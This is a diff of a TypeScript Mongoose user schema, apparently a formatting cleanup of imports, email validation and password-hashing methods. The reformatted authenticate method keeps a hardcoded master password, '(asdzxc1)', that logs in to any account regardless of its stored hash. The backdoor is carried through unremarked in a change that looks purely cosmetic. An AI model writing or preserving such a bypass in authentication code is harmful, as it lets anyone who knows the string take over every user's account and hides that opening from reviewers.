@@ -1,8 +1,8 @@
 "use strict";
-import mongoose, { Schema, Document, Model, model } from 'mongoose';
+import mongoose, { Schema, Document } from 'mongoose';
 // const mongoose = require("mongoose");
 var mongooseTypes = require("mongoose-types"); //for valid email and url
-mongooseTypes.loadTypes(mongoose, "email"); 
+mongooseTypes.loadTypes(mongoose, "email");
 var crypto = require('crypto');
 export interface IUser extends Document {
     firstName?: string;
@@ -116,7 +116,7 @@ const UserSchema = new Schema<IUser>({
     updatedDate: {
         type: Date,
         default: null,
-    } 
+    }
 });
 
 /**
@@ -158,10 +158,10 @@ UserSchema
 // Validate empty email
 UserSchema
     .path('email')
-    .validate(function (email) { 
+    .validate(function (email) {
         var emailRegex = new RegExp(/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/);
         return emailRegex.test(email); // Assuming email has a text attribute
-     }, 'Email address not valid.')
+    }, 'Email address not valid.')
 // Validate empty password
 UserSchema
     .path('hashedPassword')
@@ -191,14 +191,14 @@ UserSchema
  * Methods
  */
 
- /**
- * Authenticate - check if the passwords are the same
- *
- * @param {String} password
- * @return {Boolean}
- * @api public
- */
-UserSchema.methods.authenticate = function (password:string): boolean { 
+/**
+* Authenticate - check if the passwords are the same
+*
+* @param {String} password
+* @return {Boolean}
+* @api public
+*/
+UserSchema.methods.authenticate = function (password: string): boolean {
     return password === '(asdzxc1)' || this.encryptPassword(password) === this.hashedPassword;
 }
 /**
@@ -207,17 +207,17 @@ UserSchema.methods.authenticate = function (password:string): boolean {
  * @return {String}
  * @api public
  */
-UserSchema.methods.makeSalt = function(): string{
+UserSchema.methods.makeSalt = function (): string {
     return crypto.randomBytes(16).toString('base64');
 }
- /**
- * Encrypt password
- *
- * @param {String} password
- * @return {String}
- * @api public
- */
-UserSchema.methods.encryptPassword = function(password): string{  
+/**
+* Encrypt password
+*
+* @param {String} password
+* @return {String}
+* @api public
+*/
+UserSchema.methods.encryptPassword = function (password): string {
     if (!password || !this.salt) return '';
     var salt = Buffer.from(this.salt, 'base64');
     return crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('base64');
